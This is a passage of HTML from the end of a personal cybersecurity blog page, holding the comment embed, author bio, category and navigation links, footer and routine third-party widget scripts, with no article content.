'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Phil Malle</div> <div class="card-body"> <p class="author_bio">Hi, my name is Phil Malle. This is my personal blog about technologies, Cyber-Security and other similar topics.</p><a class="github-button" href="https://github.com/PhilMalle/philmalle.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star PhilMalle/philmalle.github.io on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#walkthroughs"></div> <li class="tag-head"> <a href="/blog/categories/walkthroughs">walkthroughs</a> </li> <a name="walkthroughs"></a> <div id="#journey"></div> <li class="tag-head"> <a href="/blog/categories/journey">journey</a> </li> <a name="journey"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/about">About Me</a> </li> <li> <a href="/gallery">Achievements</a> </li> <li> <a href="/blog">Blog</a> </li> <li> <a href="/contact">Contact</a> </li> <li> <a href="/links">Links</a> </li> <li> <a href="/pgp">GNUPG-Public Key</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. &copy; by Phil Malle 2021</p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> <!-- olvy releases --> <script> var OlvyConfig = { organisation: "", target: "#olvy-target", type: "sidebar", view: { showSearch: true, compact: true, showHeader: true, /* only applies when widget type is embed. you cannot hide header for modal and sidebar widgets */ showUnreadIndicator: true, unreadIndicatorColor: "#FFA13AFF", unreadIndicatorPosition: "top-right" } }; </script> <script type="text/javascript" src="https://app.olvy.co/script.js" defer="defer"></script> </body> </html>
